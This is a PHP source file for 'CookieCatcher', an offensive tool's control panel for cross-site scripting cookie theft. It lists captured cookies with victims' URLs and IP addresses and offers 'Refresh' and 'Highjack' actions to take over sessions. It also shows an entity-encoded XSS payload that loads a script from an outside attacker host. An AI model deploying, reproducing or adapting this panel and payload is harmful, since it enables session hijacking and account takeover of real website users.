<?php
include('inc/configure.php');
include('inc/mysql_querylab.php');
include('inc/cookieCatcher.php');

////////////////////////////////////
## Initiate Objects/Classes
$catcher = new cookieCatcher();

////////////////////////////////////
## Initiate DB Connection
$catcher->connect($db_HOST,$db_USERNAME,$db_PASSWORD,$db_NAME);

////////////////////////////////////
## Declare Variables
$message = '';
$cookieResults = '';

////////////////////////////////////
## Cookie Commands
if(isset($_GET['action'])) {
  switch($_GET['action']) {
    case 'refresh':
      $result = $catcher->refresh($_GET['cookieID']);
      $message .= $result ? "Cookie #".htmlspecialchars($_GET['cookieID'])." Refreshed<br/>" : "An error occurred.<br/>";
      $message .= "<iframe id=\"frame\" src=\"http://".$site_URL."?cookieID=".htmlspecialchars($_GET['cookieID'])."&action=view\"></iframe>";
      break;
    case 'refresh-all':
      //do something
      $cookies = $catcher->view();
      if($cookies->recordCount>0) {
        foreach($cookies->results as $cookie) {
          $result = $catcher->refresh($cookie['id']);
          $message .= $result ? "Cookie #".htmlspecialchars($cookie['id'])." Refreshed<br/>" : "An error occurred.<br/>";
        }
      }
      break;
    case 'steal':
      $result = $catcher->steal($_GET['cookieID']);
      $message = "<pre id=\"payload2\">$result</pre>";
      break;
    case 'view':
      $result = $catcher->refresh($_GET['cookieID']);
      print_r($result);
      $message .= "<div id=\"view\">".$result."</div>";
      die($message);
      break;
    default:
      //do nothing
  }
}

////////////////////////////////////
## Load Stored Cookies
if(isset($_GET['cookieID'])) {
  $cookies = $catcher->view($_GET['cookieID']);
} else {
  $cookies = $catcher->view();
}

////////////////////////////////////
## Print Cookies to Page
if($cookies->recordCount>0) {
  foreach($cookies->results as $cookie) {
    $cookieResults .= "<div class=\"column\">#".$cookie['id']."</div><div class=\"column\" style=\"width:50%;\">".$cookie['url']." (".$cookie['ip'].")</div><div class=\"column right\"><a href=\"?cookieID=".$cookie['id']."&action=refresh\">Refresh</a> - <a href=\"?cookieID=".$cookie['id']."&action=steal\">Highjack</a></div><br clear=\"both\"/>";
  }
} else {
  $cookieResults = "Cookie #".$cookie['id']."not found.";
}

?>

<html>
<head>
<title>CookieCatcher BETA v0.1</title>
<style>
h1,h2,h3 { color:#333; font-family: 'Crushed', cursive; }
body {
background: #cedce7!important;
background: -moz-linear-gradient(top,  #cedce7 0%, #596a72 100%);
background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#cedce7), color-stop(100%,#596a72));
background: -webkit-linear-gradient(top,  #cedce7 0%,#596a72 100%);
background: -o-linear-gradient(top,  #cedce7 0%,#596a72 100%);
background: -ms-linear-gradient(top,  #cedce7 0%,#596a72 100%);
background: linear-gradient(top,  #cedce7 0%,#596a72 100%);
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#cedce7', endColorstr='#596a72',GradientType=0 );
height:1500px;
}
#payload { padding:10px; background:#ffffff; border:1px dashed #666666; text-align:center; font-family:courier; color:#666 }
#payload2 { padding:10px; background:#ffffff; border:1px dashed #666666; text-align:left; font-family:courier; color:#666 }
span { font-family: courier; font-size:12px; }
#tag { padding:2px; background:#666; color:#ffffff; font-weight: normal; font-size:12px; text-align:center; width:80px;}
#frame { width:100%; height:400px; border:1px dashed #666666; }
.table { background: #ffffff; border:1px dashed #666666; opacity:0.5;}
.column { float:left; padding:5px 15px; min-width:5%; background-color:#fff; margin-bottom:2px;}
.right { float:right };
</style>
</head>
<body>

<PRE>  ____            _    _         ____      _       _               
 / ___|___   ___ | | _(_) ___   / ___|__ _| |_ ___| |__   ___ _ __ 
| |   / _ \ / _ \| |/ / |/ _ \ | |   / _` | __/ __| '_ \ / _ \ '__|
| |__| (_) | (_) |   &lt;| |  __/ | |__| (_| | || (__| | | |  __/ |   
 \____\___/ \___/|_|\_\_|\___|  \____\__,_|\__\___|_| |_|\___|_|   
                                                                   
</PRE>
<div id="tag">XSS Payload</div>
<div id="payload">
&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x64;&#x61;&#x72;&#x6b;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x43;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x43;&#x61;&#x74;&#x63;&#x68;&#x65;&#x72;&#x2f;&#x78;&#x2e;&#x6a;&#x73;&#x22;&#x3e;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
</div>

<p><?php echo $message; ?></p>
<p>
<div class="table"><?php echo $message=='' ? $cookieResults : '<a href="?">back</a>'; ?></p></div>

</body>
</html>
